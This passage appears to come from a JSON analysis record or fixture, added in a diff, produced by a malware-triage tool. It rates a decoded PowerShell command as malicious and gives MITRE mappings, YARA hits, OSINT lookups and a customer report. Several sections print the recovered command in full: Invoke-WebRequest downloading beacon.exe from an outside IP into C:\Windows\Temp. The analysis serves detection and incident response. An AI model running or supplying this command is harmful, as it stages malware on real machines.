+        "input_nodes": [
+          "N-001"
+        ],
+        "output_nodes": [
+          "N-002"
+        ]
+      },
+      {
+        "step_id": "RS-003",
+        "at": "2026-01-01T00:00:03+00:00",
+        "rule": "decoder.family-cobaltstrike",
+        "explanation": "Decoder 'family-cobaltstrike' peeled one layer of the payload.",
+        "input_nodes": [
+          "N-002"
+        ],
+        "output_nodes": [
+          "N-003"
+        ]
+      },
+      {
+        "step_id": "RS-004",
+        "at": "2026-01-01T00:00:04+00:00",
+        "rule": "ioc.url.extract",
+        "explanation": "Recovered URL `http://185.220.101.5/beacon.exe` from the decoded payload.",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-004"
+        ]
+      },
+      {
+        "step_id": "RS-005",
+        "at": "2026-01-01T00:00:05+00:00",
+        "rule": "ioc.ip.extract",
+        "explanation": "Recovered IP address `185.220.101.5` from the decoded payload.",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-005"
+        ]
+      },
+      {
+        "step_id": "RS-006",
+        "at": "2026-01-01T00:00:06+00:00",
+        "rule": "mitre.map.T1105",
+        "explanation": "Mapped to ATT&CK T1105 \u00b7 Ingress Tool Transfer \u2014 inferred from the decoded payload's behaviour.",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-006"
+        ]
+      },
+      {
+        "step_id": "RS-007",
+        "at": "2026-01-01T00:00:07+00:00",
+        "rule": "mitre.map.T1059.001",
+        "explanation": "Mapped to ATT&CK T1059.001 \u00b7 PowerShell \u2014 inferred from the decoded payload's behaviour.",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-007"
+        ]
+      },
+      {
+        "step_id": "RS-008",
+        "at": "2026-01-01T00:00:08+00:00",
+        "rule": "mitre.map.T1074.001",
+        "explanation": "Mapped to ATT&CK T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory \u2014 inferred from the decoded payload's behaviour.",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-008"
+        ]
+      },
+      {
+        "step_id": "RS-009",
+        "at": "2026-01-01T00:00:09+00:00",
+        "rule": "lolbin.detect.powershell",
+        "explanation": "Detected LOLBIN reference to `powershell` \u2014 signed binary can proxy execution and evade allow-lists.",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-009"
+        ]
+      },
+      {
+        "step_id": "RS-010",
+        "at": "2026-01-01T00:00:10+00:00",
+        "rule": "verdict.compute",
+        "explanation": "Verdict derived from class distribution: 0 critical \u00b7 4 high \u00b7 2 medium \u00b7 3 low \u00b7 0 context. Top contributors: IP \u00b7 185.220.101.5 [high, w=3.0] \u00b7 Ingress Tool Transfer [high, w=3.0] \u00b7 Correlated evidence chain \u00b7 3 stages [high, w=3.0].",
+        "input_nodes": [
+          "N-005",
+          "N-006",
+          "SYNTH-CHAIN-3",
+          "N-009",
+          "N-007",
+          "N-008",
+          "N-004",
+          "N-002",
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-010"
+        ]
+      }
+    ],
+    "summary": {
+      "executive": "Event: powershell was invoked with an obfuscated command consistent with confirmed malicious activity. The recovered command hides its actual behaviour from static inspection. Behaviour maps to T1105 \u00b7 Ingress Tool Transfer, T1059.001 \u00b7 PowerShell. Verdict: Malicious at 97% confidence.",
+      "analyst": "Event: powershell was invoked with an obfuscated command consistent with confirmed malicious activity. Recovered payload reads: `powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"`, which corroborates that powershell was used as a launcher for downstream code rather than a routine administrative task.\n\nLiving-off-the-land use of powershell bypasses application-allowlisting because the binary itself is signed and trusted; the malicious intent lives in the arguments, not the executable. Investigation mapped the observed behaviour to T1105 \u00b7 Ingress Tool Transfer, T1059.001 \u00b7 PowerShell, T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory.\n\nSupporting evidence, in weight order: IP \u00b7 185.220.101.5 [N-005]; Ingress Tool Transfer [N-006]; Correlated evidence chain \u00b7 3 stages [SYNTH-CHAIN-3]; LOLBIN \u00b7 powershell [N-009]; PowerShell [N-007]. Recovered network/host indicators cover 1 external domain(s), 1 external IP(s).\n\nImpact is confirmed malicious. Any endpoint that executed this payload should be considered compromised until proven otherwise. Scope of observed entities: 1 external domain(s), 1 external IP(s).\n\nNo containment signal was observed in the submitted evidence (no quarantine, block, or prevent action was reported). This does not mean containment did not occur \u2014 it means the artefact submitted to NivXRay did not include that telemetry.\n\nRecommended next actions: 1. Isolate affected hosts and block the identified indicators at the perimeter; 2. Preserve host artefacts and start forensic triage for the affected users.",
+      "technical": "L0 \u00b7 extract-payload \u2192 Payload isolation (script wrapper strip)\nL1 \u00b7 family-cobaltstrike \u2192 family-cobaltstrike\nfinding \u00b7 IP \u00b7 185.220.101.5 \u00b7 weight=3.0 \u00b7 conf=90%\nfinding \u00b7 Ingress Tool Transfer \u00b7 weight=3.0 \u00b7 conf=80%\nfinding \u00b7 Correlated evidence chain \u00b7 3 stages \u00b7 weight=3.0 \u00b7 conf=80%\nfinding \u00b7 LOLBIN \u00b7 powershell \u00b7 weight=3.0 \u00b7 conf=70%\nfinding \u00b7 PowerShell \u00b7 weight=2.0 \u00b7 conf=80%\nfinding \u00b7 Local staging in Public/ProgramData/Temp directory \u00b7 weight=2.0 \u00b7 conf=80%\nfinding \u00b7 URL \u00b7 http://185.220.101.5/beacon.exe \u00b7 weight=1.0 \u00b7 conf=90%\nfinding \u00b7 internal decoder step \u00b7 weight=1.0 \u00b7 conf=85%\nfinding \u00b7 internal decoder step \u00b7 weight=1.0 \u00b7 conf=85%\nATT&CK \u00b7 T1105 \u00b7 Ingress Tool Transfer \u00b7 Command and Control\nATT&CK \u00b7 T1059.001 \u00b7 PowerShell \u00b7 Execution\nATT&CK \u00b7 T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory \u00b7 Collection",
+      "attack_story": "Attack chain: 1. Layer 0: extract-payload \u2192 2. Layer 1: family-cobaltstrike \u2192 3. Correlated evidence chain \u00b7 3 stages \u2192 4. Verdict: Malicious.",
+      "key_findings": [
+        {
+          "id": "kf-001",
+          "label": "IP \u00b7 185.220.101.5",
+          "weight": 3.0,
+          "confidence": 0.9,
+          "evidence_node_ids": [
+            "N-005"
+          ]
+        },
+        {
+          "id": "kf-002",
+          "label": "Ingress Tool Transfer",
+          "weight": 3.0,
+          "confidence": 0.8,
+          "evidence_node_ids": [
+            "N-006"
+          ]
+        },
+        {
+          "id": "kf-003",
+          "label": "Correlated evidence chain \u00b7 3 stages",
+          "weight": 3.0,
+          "confidence": 0.8,
+          "evidence_node_ids": [
+            "SYNTH-CHAIN-3"
+          ]
+        },
+        {
+          "id": "kf-004",
+          "label": "LOLBIN \u00b7 powershell",
+          "weight": 3.0,
+          "confidence": 0.7,
+          "evidence_node_ids": [
+            "N-009"
+          ]
+        },
+        {
+          "id": "kf-005",
+          "label": "PowerShell",
+          "weight": 2.0,
+          "confidence": 0.8,
+          "evidence_node_ids": [
+            "N-007"
+          ]
+        },
+        {
+          "id": "kf-006",
+          "label": "Local staging in Public/ProgramData/Temp directory",
+          "weight": 2.0,
+          "confidence": 0.8,
+          "evidence_node_ids": [
+            "N-008"
+          ]
+        },
+        {
+          "id": "kf-007",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "weight": 1.0,
+          "confidence": 0.9,
+          "evidence_node_ids": [
+            "N-004"
+          ]
+        },
+        {
+          "id": "kf-008",
+          "label": "internal decoder step",
+          "weight": 1.0,
+          "confidence": 0.85,
+          "evidence_node_ids": [
+            "N-002"
+          ]
+        },
+        {
+          "id": "kf-009",
+          "label": "internal decoder step",
+          "weight": 1.0,
+          "confidence": 0.85,
+          "evidence_node_ids": [
+            "N-003"
+          ]
+        }
+      ],
+      "unknowns": [],
+      "recommendations": [
+        {
+          "id": "rc-001",
+          "priority": "critical",
+          "action": "Isolate affected hosts and block the identified indicators at the perimeter.",
+          "rationale": "Verdict is Malicious with confirmed dominant evidence.",
+          "evidence_node_ids": [
+            "N-005",
+            "N-006",
+            "SYNTH-CHAIN-3",
+            "N-009",
+            "N-007"
+          ]
+        },
+        {
+          "id": "rc-002",
+          "priority": "high",
+          "action": "Preserve host artefacts and start forensic triage for the affected users.",
+          "rationale": "Preservation supports downstream IR and post-incident review.",
+          "evidence_node_ids": [
+            "N-005",
+            "N-006",
+            "SYNTH-CHAIN-3",
+            "N-009",
+            "N-007"
+          ]
+        }
+      ],
+      "confidence": 0.9746,
+      "evidence_digest": {
+        "total_nodes": 11,
+        "contributors": 9,
+        "not_counted": 0,
+        "by_kind": {
+          "artifact": 1,
+          "decoded_fragment": 2,
+          "ioc": 2,
+          "mitre_technique": 3,
+          "lolbin": 1,
+          "behaviour": 1,
+          "verdict": 1
+        }
+      },
+      "attack_chain": [
+        {
+          "order": 1,
+          "label": "Layer 0: extract-payload",
+          "node_id": "N-002",
+          "tactic": null
+        },
+        {
+          "order": 2,
+          "label": "Layer 1: family-cobaltstrike",
+          "node_id": "N-003",
+          "tactic": null
+        },
+        {
+          "order": 3,
+          "label": "Correlated evidence chain \u00b7 3 stages",
+          "node_id": "SYNTH-CHAIN-3",
+          "tactic": null
+        },
+        {
+          "order": 4,
+          "label": "Verdict: Malicious",
+          "node_id": "N-010",
+          "tactic": null
+        }
+      ],
+      "entities_digest": {
+        "hosts": [],
+        "users": [],
+        "hashes": [],
+        "external_domains": [
+          "http://185.220.101.5/beacon.exe"
+        ],
+        "external_ips": [
+          "185.220.101.5"
+        ],
+        "lolbins": [
+          "powershell"
+        ]
+      },
+      "mitre_digest": {
+        "techniques": [
+          {
+            "id": "T1105",
+            "name": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          },
+          {
+            "id": "T1059.001",
+            "name": "PowerShell",
+            "tactic": "Execution"
+          },
+          {
+            "id": "T1074.001",
+            "name": "Local staging in Public/ProgramData/Temp directory",
+            "tactic": "Collection"
+          }
+        ],
+        "tactics": [
+          "Collection",
+          "Command and Control",
+          "Execution"
+        ],
+        "coverage": 3
+      },
+      "timeline_digest": {
+        "steps": 10,
+        "verdict_step_id": "RS-010"
+      },
+      "report_sections": {
+        "what_happened": "Event: powershell was invoked with an obfuscated command consistent with confirmed malicious activity. Recovered payload reads: `powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"`, which corroborates that powershell was used as a launcher for downstream code rather than a routine administrative task.\n\nLiving-off-the-land use of powershell bypasses application-allowlisting because the binary itself is signed and trusted; the malicious intent lives in the arguments, not the executable. Investigation mapped the observed behaviour to T1105 \u00b7 Ingress Tool Transfer, T1059.001 \u00b7 PowerShell, T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory.\n\nSupporting evidence, in weight order: IP \u00b7 185.220.101.5 [N-005]; Ingress Tool Transfer [N-006]; Correlated evidence chain \u00b7 3 stages [SYNTH-CHAIN-3]; LOLBIN \u00b7 powershell [N-009]; PowerShell [N-007]. Recovered network/host indicators cover 1 external domain(s), 1 external IP(s).\n\nImpact is confirmed malicious. Any endpoint that executed this payload should be considered compromised until proven otherwise. Scope of observed entities: 1 external domain(s), 1 external IP(s).\n\nNo containment signal was observed in the submitted evidence (no quarantine, block, or prevent action was reported). This does not mean containment did not occur \u2014 it means the artefact submitted to NivXRay did not include that telemetry.\n\nRecommended next actions: 1. Isolate affected hosts and block the identified indicators at the perimeter; 2. Preserve host artefacts and start forensic triage for the affected users.",
+        "what_we_found": "Key findings: IP \u00b7 185.220.101.5, Ingress Tool Transfer, Correlated evidence chain \u00b7 3 stages, LOLBIN \u00b7 powershell, PowerShell",
+        "what_we_dont_know": "No open unknowns.",
+        "what_to_do": "Actions: Isolate affected hosts and block the identified indicators at the perimeter. \u00b7 Preserve host artefacts and start forensic triage for the affected users."
+      },
+      "customer_report": {
+        "persona": "customer",
+        "verdict": "Malicious",
+        "verdict_confidence_pct": 97,
+        "sections": [
+          {
+            "number": 1,
+            "title": "Executive Summary",
+            "body": "Verdict: **Malicious** (confidence 97%). No affected-host telemetry was included with this submission. Execution vector: powershell. Network target: http://185.220.101.5/beacon.exe.",
+            "citations": [
+              "cio.verdict",
+              "cio.entities",
+              "cio.metadata.iocs",
+              "cio.evidence_graph"
+            ]
+          },
+          {
+            "number": 2,
+            "title": "Incident Overview",
+            "body": "The submission triggered powershell with an obfuscated command that, once recovered, resolves to `powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"`. The recovered command reaches out to **http://185.220.101.5/beacon.exe**, which is characteristic of second-stage payload staging. The observed behaviour maps to **T1105 \u00b7 Ingress Tool Transfer** and **T1059.001 \u00b7 PowerShell**. Aggregate evidence supports a **Malicious** verdict \u2014 the sample should be treated as attacker-controlled until proven otherwise.",
+            "citations": [
+              "cio.truth.findings",
+              "cio.decode_chain",
+              "cio.evidence_graph"
+            ]
+          },
+          {
+            "number": 3,
+            "title": "Recovered Command",
+            "body": "```\npowershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"\n```",
+            "citations": [
+              "cio.decode_chain"
+            ]
+          },
+          {
+            "number": 4,
+            "title": "Detection Source",
+            "body": "Ad-hoc analyst submission",
+            "citations": [
+              "cio.metadata.detection_source"
+            ]
+          },
+          {
+            "number": 5,
+            "title": "Execution Chain",
+            "body": "* Living-off-the-land binary invoked (powershell)\n* Correlated evidence chain \u00b7 3 stages",
+            "citations": [
+              "cio.evidence_graph"
+            ]
+          },
+          {
+            "number": 6,
+            "title": "Evidence",
+            "body": "* **IP \u00b7 185.220.101.5** (high) \u2014 external_ioc_ip\n* **Ingress Tool Transfer** (high)\n* **Correlated evidence chain \u00b7 3 stages** (high)\n* **LOLBIN \u00b7 powershell** (high)\n* **PowerShell** (medium) \u2014 mitre_technique\n* **Local staging in Public/ProgramData/Temp directory** (medium) \u2014 mitre_technique",
+            "citations": [
+              "cio.truth.findings"
+            ]
+          },
+          {
+            "number": 7,
+            "title": "IOCs",
+            "body": "* URL: `http://185.220.101.5/beacon.exe`\n* IP: `185.220.101.5`",
+            "citations": [
+              "cio.metadata.iocs"
+            ]
+          },
+          {
+            "number": 8,
+            "title": "MITRE ATT&CK",
+            "body": "* **Command and Control**: T1105 \u00b7 Ingress Tool Transfer\n* **Execution**: T1059.001 \u00b7 PowerShell\n* **Collection**: T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory",
+            "citations": [
+              "cio.evidence_graph"
+            ]
+          },
+          {
+            "number": 9,
+            "title": "Impact Assessment",
+            "body": "Any endpoint that executed this payload should be considered compromised until proven otherwise.",
+            "citations": [
+              "cio.verdict"
+            ]
+          },
+          {
+            "number": 10,
+            "title": "Analyst Verdict",
+            "body": "**Malicious** at 97% confidence. Verdict derived from class distribution: 0 critical \u00b7 4 high \u00b7 2 medium \u00b7 3 low \u00b7 0 context. Top contributors: IP \u00b7 185.220.101.5 [high, w=3.0] \u00b7 Ingress Tool Transfer [high, w=3.0] \u00b7 Correlated evidence chain \u00b7 3 stages [high, w=3.0].",
+            "citations": [
+              "cio.verdict"
+            ]
+          },
+          {
+            "number": 11,
+            "title": "Recommendations",
+            "body": "* **CONTAIN** (p0): Isolate the affected host from the network and preserve volatile memory. Block the extracted C2 indicators at the perimeter and endpoint layers.\n* **HUNT** (p1): Hunt for the same execution chain and extracted IOCs across the estate over the past 30 days. Correlate against parent-process / user-SID entities.\n* **NOTIFY** (p1): Notify the customer with the Investigation Truth Model summary, the extracted IOCs, and the confidence-breakdown chart. Attach the STIX bundle.",
+            "citations": [
+              "cio.truth.recommendations"
+            ]
+          }
+        ],
+        "markdown": "# Investigation Report \u2014 Verdict: **Malicious** (97%)\n\n## 1. Executive Summary\n\nVerdict: **Malicious** (confidence 97%). No affected-host telemetry was included with this submission. Execution vector: powershell. Network target: http://185.220.101.5/beacon.exe.\n\n*Sources \u2014 cio.verdict, cio.entities, cio.metadata.iocs, cio.evidence_graph*\n\n## 2. Incident Overview\n\nThe submission triggered powershell with an obfuscated command that, once recovered, resolves to `powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"`. The recovered command reaches out to **http://185.220.101.5/beacon.exe**, which is characteristic of second-stage payload staging. The observed behaviour maps to **T1105 \u00b7 Ingress Tool Transfer** and **T1059.001 \u00b7 PowerShell**. Aggregate evidence supports a **Malicious** verdict \u2014 the sample should be treated as attacker-controlled until proven otherwise.\n\n*Sources \u2014 cio.truth.findings, cio.decode_chain, cio.evidence_graph*\n\n## 3. Recovered Command\n\n```\npowershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"\n```\n\n*Sources \u2014 cio.decode_chain*\n\n## 4. Detection Source\n\nAd-hoc analyst submission\n\n*Sources \u2014 cio.metadata.detection_source*\n\n## 5. Execution Chain\n\n* Living-off-the-land binary invoked (powershell)\n* Correlated evidence chain \u00b7 3 stages\n\n*Sources \u2014 cio.evidence_graph*\n\n## 6. Evidence\n\n* **IP \u00b7 185.220.101.5** (high) \u2014 external_ioc_ip\n* **Ingress Tool Transfer** (high)\n* **Correlated evidence chain \u00b7 3 stages** (high)\n* **LOLBIN \u00b7 powershell** (high)\n* **PowerShell** (medium) \u2014 mitre_technique\n* **Local staging in Public/ProgramData/Temp directory** (medium) \u2014 mitre_technique\n\n*Sources \u2014 cio.truth.findings*\n\n## 7. IOCs\n\n* URL: `http://185.220.101.5/beacon.exe`\n* IP: `185.220.101.5`\n\n*Sources \u2014 cio.metadata.iocs*\n\n## 8. MITRE ATT&CK\n\n* **Command and Control**: T1105 \u00b7 Ingress Tool Transfer\n* **Execution**: T1059.001 \u00b7 PowerShell\n* **Collection**: T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory\n\n*Sources \u2014 cio.evidence_graph*\n\n## 9. Impact Assessment\n\nAny endpoint that executed this payload should be considered compromised until proven otherwise.\n\n*Sources \u2014 cio.verdict*\n\n## 10. Analyst Verdict\n\n**Malicious** at 97% confidence. Verdict derived from class distribution: 0 critical \u00b7 4 high \u00b7 2 medium \u00b7 3 low \u00b7 0 context. Top contributors: IP \u00b7 185.220.101.5 [high, w=3.0] \u00b7 Ingress Tool Transfer [high, w=3.0] \u00b7 Correlated evidence chain \u00b7 3 stages [high, w=3.0].\n\n*Sources \u2014 cio.verdict*\n\n## 11. Recommendations\n\n* **CONTAIN** (p0): Isolate the affected host from the network and preserve volatile memory. Block the extracted C2 indicators at the perimeter and endpoint layers.\n* **HUNT** (p1): Hunt for the same execution chain and extracted IOCs across the estate over the past 30 days. Correlate against parent-process / user-SID entities.\n* **NOTIFY** (p1): Notify the customer with the Investigation Truth Model summary, the extracted IOCs, and the confidence-breakdown chart. Attach the STIX bundle.\n\n*Sources \u2014 cio.truth.recommendations*",
+        "critique": {
+          "passed": true,
+          "score": 100,
+          "persona": "customer",
+          "issues": [
+            {
+              "severity": "info",
+              "code": "drop-empty-section",
+              "message": "Section 'Affected Hosts' is empty and should be hidden.",
+              "section": "Affected Hosts",
+              "remediation": "Dynamic section selection will hide this at render time."
+            },
+            {
+              "severity": "info",
+              "code": "drop-empty-section",
+              "message": "Section 'Users' is empty and should be hidden.",
+              "section": "Users",
+              "remediation": "Dynamic section selection will hide this at render time."
+            },
+            {
+              "severity": "info",
+              "code": "drop-empty-section",
+              "message": "Section 'Timeline' is empty and should be hidden.",
+              "section": "Timeline",
+              "remediation": "Dynamic section selection will hide this at render time."
+            },
+            {
+              "severity": "info",
+              "code": "drop-empty-section",
+              "message": "Section 'File Hashes' is empty and should be hidden.",
+              "section": "File Hashes",
+              "remediation": "Dynamic section selection will hide this at render time."
+            },
+            {
+              "severity": "info",
+              "code": "drop-empty-section",
+              "message": "Section 'Threat Intelligence' is empty and should be hidden.",
+              "section": "Threat Intelligence",
+              "remediation": "Dynamic section selection will hide this at render time."
+            },
+            {
+              "severity": "info",
+              "code": "drop-empty-section",
+              "message": "Section 'Containment Status' is empty and should be hidden.",
+              "section": "Containment Status",
+              "remediation": "Dynamic section selection will hide this at render time."
+            }
+          ],
+          "coverage": [
+            {
+              "field": "hosts",
+              "present_in_cio": false,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "users",
+              "present_in_cio": false,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "file_hashes",
+              "present_in_cio": false,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "iocs",
+              "present_in_cio": true,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "mitre",
+              "present_in_cio": true,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "osint",
+              "present_in_cio": false,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "timeline",
+              "present_in_cio": false,
+              "present_in_report": true,
+              "ok": true
+            },
+            {
+              "field": "recommendations",
+              "present_in_cio": true,
+              "present_in_report": true,
+              "ok": true
+            }
+          ],
+          "dropped_sections": [
+            "Affected Hosts",
+            "Users",
+            "Timeline",
+            "File Hashes",
+            "Threat Intelligence",
+            "Containment Status"
+          ],
+          "kept_sections": [
+            "Executive Summary",
+            "Incident Overview",
+            "Recovered Command",
+            "Detection Source",
+            "Execution Chain",
+            "Evidence",
+            "IOCs",
+            "MITRE ATT&CK",
+            "Impact Assessment",
+            "Analyst Verdict",
+            "Recommendations"
+          ]
+        }
+      },
+      "report_validation": {
+        "status": "pass",
+        "score": 100,
+        "blockers": [],
+        "warnings": [],
+        "checks": {
+          "no_raw_markdown_leaks": true,
+          "contiguous_section_numbering": true,
+          "verdict_has_contributors": true,
+          "ioc_surface_present": true,
+          "mitre_surface_present": true,
+          "recovered_payload_surface_present": true,
+          "recommendations_evidence_backed": true,
+          "persona_hygiene_pass": true
+        },
+        "summary": "PASS \u00b7 8/8 checks passed \u00b7 score 100 \u00b7 0 blocker(s) \u00b7 0 warning(s)"
+      },
+      "composer_version": "slice-d-v1"
+    },
+    "recommendations": [
+      {
+        "id": "rc-001",
+        "priority": "critical",
+        "action": "Isolate affected hosts and block the identified indicators at the perimeter.",
+        "rationale": "Verdict is Malicious with confirmed dominant evidence.",
+        "evidence_node_ids": [
+          "N-005",
+          "N-006",
+          "SYNTH-CHAIN-3",
+          "N-009",
+          "N-007"
+        ]
+      },
+      {
+        "id": "rc-002",
+        "priority": "high",
+        "action": "Preserve host artefacts and start forensic triage for the affected users.",
+        "rationale": "Preservation supports downstream IR and post-incident review.",
+        "evidence_node_ids": [
+          "N-005",
+          "N-006",
+          "SYNTH-CHAIN-3",
+          "N-009",
+          "N-007"
+        ]
+      }
+    ],
+    "reports": {},
+    "metadata": {
+      "adr": "0014",
+      "slice": "D",
+      "node_count": 11,
+      "edge_count": 17,
+      "reasoning_step_count": 10,
+      "verdict_engine": "unified-verdict-engine-v1",
+      "input_understanding": {
+        "type": "powershell",
+        "label": "PowerShell Command",
+        "confidence": 0.85,
+        "fingerprints": [
+          "ps_hints"
+        ],
+        "route": "decode",
+        "size_bytes": 106,
+        "line_count": 1
+      },
+      "custom_recipes_matched": [],
+      "lolbas": [],
+      "lolbins_v2": {
+        "executed": [],
+        "referenced": [],
+        "expanded": []
+      },
+      "ti_shield": [
+        {
+          "layer": 0,
+          "label": "L0 \u00b7 RAW INPUT",
+          "op": "raw",
+          "preview": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+          "iocs": {
+            "urls": [
+              "http://185.220.101.5/beacon.exe"
+            ],
+            "ips": [
+              "185.220.101.5"
+            ],
+            "domains": [],
+            "emails": [],
+            "md5": [],
+            "sha1": [],
+            "sha256": [],
+            "bitcoin_addresses": []
+          },
+          "lolbas": [],
+          "mitre": [
+            {
+              "id": "T1105",
+              "technique": "Ingress Tool Transfer",
+              "tactic": "Command and Control"
+            },
+            {
+              "id": "T1059.001",
+              "technique": "PowerShell",
+              "tactic": "Execution"
+            },
+            {
+              "id": "T1074.001",
+              "technique": "Local staging in Public/ProgramData/Temp directory",
+              "tactic": "Collection"
+            }
+          ],
+          "yara": [
+            {
+              "rule": "PS_DownloadString",
+              "severity": "high",
+              "match": "Invoke-WebRequest",
+              "description": "Remote script/binary download"
+            },
+            {
+              "rule": "PS_CaseMixed_Obfuscation",
+              "severity": "low",
+              "match": "powershell",
+              "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+            }
+          ],
+          "ti_hits": [],
+          "live_osint": {
+            "ips": [
+              {
+                "value": "185.220.101.5",
+                "reverse_dns": "berlin01.tor-exit.artikel10.org",
+                "geo": {
+                  "status": "success",
+                  "country": "Germany",
+                  "countryCode": "DE",
+                  "regionName": "Brandenburg",
+                  "city": "Brandenburg an der Havel",
+                  "isp": "Stiftung Erneuerbare Freiheit",
+                  "org": "Artikel10 e.V",
+                  "as": "AS60729 Stiftung Erneuerbare Freiheit",
+                  "mobile": false,
+                  "proxy": true,
+                  "hosting": true,
+                  "query": "185.220.101.5"
+                },
+                "abuseipdb": {
+                  "abuse_confidence_score": 100,
+                  "country_code": "DE",
+                  "usage_type": "Fixed Line ISP",
+                  "isp": "Artikel10 e.V.",
+                  "total_reports": 202,
+                  "last_reported_at": "2026-08-01T09:44:11+00:00",
+                  "is_tor": true
+                },
+                "otx": {
+                  "pulse_count": 50,
+                  "reputation": 0,
+                  "pulses": [
+                    {
+                      "name": "Gifted1 Live Perimeter Threat Intelligence Feed",
+                      "tags": [
+                        "Scanner",
+                        "Malicious-IP",
+                        "Threat-Intel",
+                        "Blocklist"
+                      ]
+                    },
+                    {
+                      "name": "IOC Records Provided by @NextRayAI",
+                      "tags": [
+                        "Nextray",
+                        "cyber security",
+                        "ioc",
+                        "phishing",
+                        "malicious"
+                      ]
+                    },
+                    {
+                      "name": "Anonymization_Network | Jul 2, 2026 | Part 1/5",
+                      "tags": [
+                        "anonymization_network"
+                      ]
+                    }
+                  ]
+                }
+              }
+            ],
+            "domains": [],
+            "urls": [
+              {
+                "value": "http://185.220.101.5/beacon.exe",
+                "scheme": "http",
+                "host": "185.220.101.5",
+                "path": "/beacon.exe",
+                "port": null,
+                "is_onion": false,
+                "urlscan": {
+                  "total": 46,
+                  "results": [
+                    {
+                      "url": "https://185.220.101.5/",
+                      "verdict": null,
+                      "score": null,
+                      "scan_id": "019f7ee0-c5bf-762d-867c-698f057b7e6b"
+                    },
+                    {
+                      "url": "https://185.220.101.5/",
+                      "verdict": null,
+                      "score": null,
+                      "scan_id": "019ebf33-1b4d-7407-8250-125638bf86ea"
+                    },
+                    {
+                      "url": "https://185.220.101.5/",
+                      "verdict": null,
+                      "score": null,
+                      "scan_id": "019ebf17-acf4-71ba-8a83-56fb2322ea9e"
+                    }
+                  ]
+                },
+                "otx": {
+                  "pulse_count": 0,
+                  "reputation": null,
+                  "pulses": []
+                }
+              }
+            ],
+            "hashes": [],
+            "sources_used": [
+              "ip-api.com (geolocation, no key)",
+              "system DNS (reverse lookup, resolution)",
+              "AbuseIPDB",
+              "URLScan.io",
+              "AlienVault OTX",
+              "Hybrid Analysis"
+            ]
+          },
+          "family_hint": "cobaltstrike",
+          "severity": {
+            "score": 54,
+            "band": "medium"
+          }
+        },
+        {
+          "layer": 1,
+          "label": "L1 \u00b7 EXTRACT-PAYLOAD",
+          "op": "extract-payload",
+          "preview": "http://185.220.101.5/beacon.exe 185.220.101.5",
+          "iocs": {
+            "urls": [
+              "http://185.220.101.5/beacon.exe"
+            ],
+            "ips": [
+              "185.220.101.5"
+            ],
+            "domains": [],
+            "emails": [],
+            "md5": [],
+            "sha1": [],
+            "sha256": [],
+            "bitcoin_addresses": []
+          },
+          "lolbas": [],
+          "mitre": [],
+          "yara": [
+            {
+              "rule": "PS_CaseMixed_Obfuscation",
+              "severity": "low",
+              "match": "beacon",
+              "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+            }
+          ],
+          "ti_hits": [],
+          "live_osint": {},
+          "family_hint": "cobaltstrike",
+          "severity": {
+            "score": 10,
+            "band": "low"
+          }
+        },
+        {
+          "layer": 2,
+          "label": "L2 \u00b7 FAMILY-COBALTSTRIKE",
+          "op": "family-cobaltstrike",
+          "preview": "http://185.220.101.5/beacon.exe 185.220.101.5",
+          "iocs": {
+            "urls": [
+              "http://185.220.101.5/beacon.exe"
+            ],
+            "ips": [
+              "185.220.101.5"
+            ],
+            "domains": [],
+            "emails": [],
+            "md5": [],
+            "sha1": [],
+            "sha256": [],
+            "bitcoin_addresses": []
+          },
+          "lolbas": [],
+          "mitre": [],
+          "yara": [
+            {
+              "rule": "PS_CaseMixed_Obfuscation",
+              "severity": "low",
+              "match": "beacon",
+              "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+            }
+          ],
+          "ti_hits": [],
+          "live_osint": {},
+          "family_hint": "cobaltstrike",
+          "severity": {
+            "score": 10,
+            "band": "low"
+          }
+        },
+        {
+          "layer": "final",
+          "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+          "op": "final",
+          "preview": "Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe",
+          "iocs": {
+            "urls": [
+              "http://185.220.101.5/beacon.exe"
+            ],
+            "ips": [
+              "185.220.101.5"
+            ],
+            "domains": [],
+            "emails": [],
+            "md5": [],
+            "sha1": [],
+            "sha256": [],
+            "bitcoin_addresses": []
+          },
+          "lolbas": [],
+          "mitre": [
+            {
+              "id": "T1105",
+              "technique": "Ingress Tool Transfer",
+              "tactic": "Command and Control"
+            },
